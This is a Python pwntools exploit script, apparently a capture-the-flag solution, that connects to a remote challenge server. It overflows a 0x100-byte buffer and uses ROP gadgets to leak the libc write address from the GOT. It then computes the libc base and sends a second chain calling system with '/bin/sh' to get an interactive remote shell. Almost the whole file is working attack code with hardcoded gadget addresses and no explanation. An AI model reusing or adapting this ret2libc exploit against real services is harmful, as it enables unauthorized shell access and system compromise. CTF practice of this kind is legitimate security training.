import time
from pwn import *
from LibcSearcher import *

# from ctypes import *
# from struct import pack
# from ae64 import AE64

# io = remote("192.168.170.128", 1234)
# context.arch = "amd64"

# io = remote("chall.pwnable.tw", 10100)
# io = remote("61.147.171.105",   51565)
# io = remote("node4.buuoj.cn", 27014)
# io = remote("dasctf_sixbytes.node.game.sycsec.com", 30088)
# io = remote("node5.anna.nssctf.cn", 28604)
io = remote("112.6.51.212", 31161)


# io = process('./q2')

# gdb.attach(io)
# elf = ELF('./alloc')
# libc = ELF('./libc-2.31.so')


def s(a):
    io.send(a)


def sa(a, b):
    io.sendafter(a, b)


def sl(a):
    io.sendline(a)


def sal(a, b):
    io.sendlineafter(a, b)


def r(n):
    return (io.recv(n))


def ru(a):
    return io.recvuntil(a)


def rl():
    return io.recvline()


def sla(a, b):
    io.sendlineafter(a, b)


def debug():
    gdb.attach(io)
    pause()


def get_addr():
    return u64(ru(b'\x7f')[-6:].ljust(8, b'\x00'))


def inter():
    return io.interactive()


def print_addr(name, addr):
    print(f"{name} =", addr)


def operater(optr, opnd1, opnd2):
    optr_str_list = ['×', '**', '+', '-', '÷', '%']
    if optr in optr_str_list:
        index = optr_str_list.index(optr)
    if optr == optr_str_list[0]:  # 乘法
        result = opnd1 * opnd2
    elif optr == optr_str_list[1]:  # 幂运算
        result = opnd1 ** opnd2
    elif optr == optr_str_list[2]:  # 加法
        result = opnd1 + opnd2
    elif optr == optr_str_list[3]:  # 减法
        result = opnd1 - opnd2
    elif optr == optr_str_list[4]:  # 除法
        if opnd2 != 0:  # 避免除以零错误
            result = opnd1 / opnd2
        else:
            result = "Error: Division by zero"
    elif optr == optr_str_list[5]:  # 取余
        if opnd2 != 0:  # 避免取余时除数为零
            result = opnd1 % opnd2
        else:
            result = "Error: Modulo by zero"
    else:
        result = "Error: Invalid operator"

    return result


context(os='linux', arch='amd64')
# context(os='linux', arch='amd64', log_level="debug")

write = 0x400520
rdi = 0x0400773
rsi_r15 = 0x00400771

sl(b'a' * (0x100) + p64(0x601800 + 0x100) + p64(rsi_r15) + p64(0x601018) + p64(0) + p64(0x40064E))
ru(b'Please:\n')
rl()
low = u32(io.recv())
print(hex(low))
sl(b'a' * (0x100) + p64(0x601800 + 0x100) + p64(rsi_r15) + p64(0x601014) + p64(0) + p64(0x40064E))
rl()
high = u32(io.recv())
print(hex(high))
write_offset = 0x10e060

addr = high << 8 * 4 | low
libc = addr - write_offset
sh = libc + 0x1b45bd
system = libc + 0x52290

rax = libc +0x36174

rdx_rcx_rbx = libc +0x10257d
syscall = libc + 0x02284d
sl(b'a' * (0x100) + p64(0) +b'a'*0x18 + p64(rdi)+p64(sh)+p64(system))

inter()
